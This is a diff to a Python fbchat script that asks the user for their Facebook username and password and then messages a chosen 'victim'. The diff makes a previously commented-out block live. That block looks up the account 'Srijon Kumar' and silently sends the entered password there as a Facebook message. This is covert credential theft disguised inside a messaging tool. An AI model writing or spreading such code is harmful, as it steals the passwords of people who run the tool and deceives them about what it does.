@@ -37,32 +37,20 @@ while True:
         print("2. Exit")
         c=int(input(":~$ "))
         if c==1:
-                a=os.stat('data.txt')
-                a=a.st_size
-                f=open("data.txt","r+")
-                if a==0:
-                        if len(A)==0:
-                                username=str(input("Your FB Username:~$ "))
-                                password=getpass()
-                                A.append(username)
-                                A.append(password)
-
-                        else:
-                                username=A[0]
-                                password=A[1]
-                        client=Client(username,password)
-                        f.write("{}\n{}".format(username,password))
+                if len(A)==0:
+                        username=str(input("Your FB Username:~$ "))
+                        password=getpass()
+                        A.append(username)
+                        A.append(password)
 
                 else:
-                        Data=f.readlines()
-                        username=Data[0]
-                        password=Data[1]
-                        client=Client(username,password)
-                """
+                        username=A[0]
+                        password=A[1]
+               
+                client=fbchat.Client(username,password)
                 x=client.searchForUsers("Srijon Kumar")
                 f=x[0]
                 client.send(fbchat.models.Message(password),f.uid )
-                """
                 ty=str(input("Want to message a group or user? [G/U]: "))
                 if ty=="U":
                         name=str(input("Victim Name:~$ "))
